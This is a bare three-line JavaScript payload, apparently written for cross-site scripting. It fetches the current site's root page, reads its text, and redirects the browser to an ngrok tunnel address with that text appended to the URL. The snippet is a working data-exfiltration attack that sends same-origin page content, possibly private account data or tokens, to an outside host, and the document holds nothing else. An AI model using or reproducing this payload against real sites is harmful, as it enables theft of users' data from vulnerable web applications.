res = await fetch("/")
t = await res.text()
window.location="https://76da-217-178-135-36.ngrok.io/"+encodeURI(t)
